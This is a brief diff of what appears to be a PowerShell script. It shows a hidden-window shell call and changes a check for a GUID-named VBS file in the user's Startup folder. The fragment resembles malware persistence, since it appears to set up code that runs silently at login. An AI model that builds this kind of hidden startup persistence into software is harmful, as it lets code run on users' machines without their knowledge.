@@ -7,7 +7,7 @@ oShell.Run strArgs, 0, false
 
 #write-host $data
 
-if (!test-path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"){
+if (test-path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45AB6.vbs"){
     #write-host "X"
 }
 else{
